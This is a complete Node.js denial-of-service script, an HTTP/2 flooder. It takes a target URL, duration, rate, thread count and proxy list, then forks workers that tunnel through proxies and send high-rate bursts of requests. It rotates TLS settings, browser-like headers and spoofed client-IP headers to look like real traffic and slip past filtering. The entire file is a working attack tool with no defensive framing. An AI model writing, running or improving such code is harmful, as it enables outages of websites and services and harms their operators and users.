const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'hmac_sha384'
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json, text/plain, */*',
    'text/html, */*; q=0.01',
    'image/webp,image/apng,image/*,*/*;q=0.8',
    'application/xml,application/json,text/html,*/*;q=0.9'
];

const lang_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.8',
    'es-ES,es;q=0.9',
    'zh-CN,zh;q=0.9',
    'ja-JP,ja;q=0.8',
    'ko-KR,ko;q=0.8',
    'ar-SA,ar;q=0.9',
    'ru-RU,ru;q=0.8',
    'it-IT,it;q=0.9'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip',
    'deflate, br',
    'compress, gzip',
    'br',
    'gzip',
    'deflate'
];

const version = [
    '"Chromium";v="120", "Google Chrome";v="120", "Not:A-Brand";v="99"',
    '"Chromium";v="119", "Google Chrome";v="119", "Not:A-Brand";v="24"',
    '"Firefox";v="115", "Not:A-Brand";v="99"',
    '"Safari";v="16.6", "AppleWebKit";v="605.1.15", "Not:A-Brand";v="99"',
    '"Edge";v="120", "Chromium";v="120", "Not:A-Brand";v="24"',
    '"Opera";v="105", "Chromium";v="119", "Not:A-Brand";v="99"',
    '"Samsung Internet";v="23.0", "Not:A-Brand";v="99"'
];

const rateHeaders = [
    { "akamai-origin-hop": randstr(15) },
    { "x-forwarded-for": `${randstr(7)}.${randstr(7)}.${randstr(7)}.${randstr(7)}` },
    { "via": `1.1 ${randstr(12)}` },
    { "client-ip": `${randstr(7)}.${randstr(7)}.${randstr(7)}.${randstr(7)}` },
    { "x-real-ip": `${randstr(7)}.${randstr(7)}.${randstr(7)}.${randstr(7)}` },
    { "x-client-ip": randstr(15) },
    { "true-client-ip": `${randstr(7)}.${randstr(7)}.${randstr(7)}.${randstr(7)}` },
    { "x-cluster-client-ip": randstr(15) },
    { "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36` },
    { "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15` },
    { "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0` }
];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    setInterval(runFlooder, 50);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
            allowHalfOpen: false
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 120000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(15) + "=" + randstr(10);
headers[":scheme"] = "https";
headers["sec-ch-ua"] = randomElement(version);
headers["sec-ch-ua-platform"] = randomElement(["Windows", "macOS", "Linux", "Android", "iOS"]);
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["accept-encoding"] = randomElement(encoding_header);
headers["accept-language"] = randomElement(lang_header);
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = randomElement(accept_header);
headers["sec-fetch-mode"] = randomElement(["navigate", "same-origin", "no-cors"]);
headers["sec-fetch-dest"] = randomElement(["document", "iframe", "script", "image"]);
headers["sec-fetch-site"] = randomElement(["same-origin", "cross-site", "none"]);
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";
headers["cache-control"] = randomElement(["no-cache", "max-age=0"]);
headers["referer"] = `https://${parsedTarget.host}/${randstr(10)}`;

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 3
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) {
                connection.close();
                connection.destroy();
            }
            return setTimeout(() => runFlooder(), 50);
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            sigals: randomElement(sig),
            socket: connection,
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
            ecdhCurve: 'P-256:P-384:P-521:X25519',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                crypto.constants.SSL_OP_NO_QUERY_MTU
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 120000);
        tlsConn.setTimeout(3000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 256,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false,
                enableConnectProtocol: true
            },
            maxSessionMemory: 1024,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    ...randomElement(rateHeaders),
                    "x-forwarded-proto": "https",
                    "x-http-version": randomElement(["2.0", "1.1"]),
                    "connection": randomElement(["keep-alive", "close"])
                };
                for (let i = 0; i < args.Rate * 2; i++) {
                    const request = client.request(dynHeaders);
                    request.setTimeout(3000);
                    request.on("response", () => {
                        request.close(http2.constants.NGHTTP2_STREAM_CLOSED);
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close(http2.constants.NGHTTP2_STREAM_CLOSED);
                        request.destroy();
                    });
                    request.on("timeout", () => {
                        request.close(http2.constants.NGHTTP2_STREAM_CLOSED);
                        request.destroy();
                    });
                    request.end();
                }
            }, 50);
            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(() => runFlooder(), 50);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(() => runFlooder(), 50);
        });

        tlsConn.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(() => runFlooder(), 50);
        });

        tlsConn.on("timeout", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(() => runFlooder(), 50);
        });
    });
}
